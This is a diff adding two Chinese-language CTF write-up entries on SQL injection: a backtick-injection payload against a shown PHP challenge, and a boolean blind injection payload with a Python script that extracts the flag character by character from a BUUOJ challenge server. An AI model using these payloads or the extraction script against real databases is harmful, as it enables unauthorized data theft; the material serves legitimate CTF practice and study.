@@ -133,3 +133,55 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
     ||起到or的作用
     语句为：select post的数据 or flag from flag;
     payload：*,1
+    
+### 9.JarvisOJ：dctf-inject
+```php
+<?php
+require("config.php");
+$table = $_GET['table']?$_GET['table']:"test";
+$table = Filter($table);  
+mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
+$sql = "select 'flag{xxx}' from secret_{$table}";
+$ret = sql_query($sql);
+echo $ret[0];
+?>
+```
+
+    wp:考察反引号注入
+    desc `表名1` `表名2`并不会报错
+    select '字段名' from 表名``union select 123;也不会报错，这里``就相当于一个空格。
+    所以payload：
+    flag``union select 123 limit 123;就可以回显123了。
+    后略
+    记得多看最终的sql执行语句，先判定从哪个语句进行注入！
+    
+##### 注意：
+    
+    mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
+    这个语句其实只需要不报错就行了，不必要返回什么东西，有点坑爹，我一直以为要有返回数据才能绕过。
+### 10.BUUCTF：[CISCN2019 华北赛区 Day2 Web1]Hack World
+
+    payload: 1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))
+
+放脚本：
+    
+```python
+import requests
+import sys
+
+
+url = 'http://3d69baf5-f2be-435e-a2e5-9f46bd2f2d9b.node3.buuoj.cn/index.php'
+data_len = len(requests.post(url, data={'id': '1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))'}).text)
+print data_len
+
+for i in range(0, 50):
+    for j in range(1, 128):
+        payload = '1^(if((ascii(substr((select(flag)from(flag)),'+str(i)+',1))='+str(j)+'),0,1))'
+        post_data = {"id" : payload}
+        res = requests.post(url, data=post_data)
+        if len(res.text) == data_len:
+            if chr(j) == '}':
+                print '}'
+                break
+            sys.stdout.write(chr(j))
+```
